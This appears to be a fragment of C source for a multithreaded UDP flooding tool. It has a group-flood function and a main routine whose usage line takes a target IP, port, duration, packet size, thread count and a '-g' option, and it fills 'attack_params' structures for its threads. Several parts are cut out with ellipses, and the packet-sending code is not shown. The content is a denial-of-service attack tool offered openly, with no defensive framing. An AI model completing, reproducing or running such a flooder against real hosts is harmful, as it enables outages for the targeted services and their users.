...
// Function to perform group UDP flooding
void group_flood(char *target_ip, int target_port, int duration, int packet_size, int thread_count) {
    // Array of thread IDs
...
int main(int argc, char *argv[]) {
    // Validate arguments
    if (argc != 6 && argc != 7) {
        printf("Usage: %s [IP] [PORT] [TIME] [PACKET_SIZE] [THREAD_COUNT] [-g]\n", argv[0]);
        return EXIT_FAILURE;
    }
    ...
    // Check if group flooding is enabled
    if (argc == 7 && strcmp(argv[6], "-g") == 0) {
        group_flood(target_ip, target_port, duration, packet_size, thread_count);
    } else {
        // Array of thread IDs
        pthread_t threads[thread_count];
        attack_params params[thread_count];
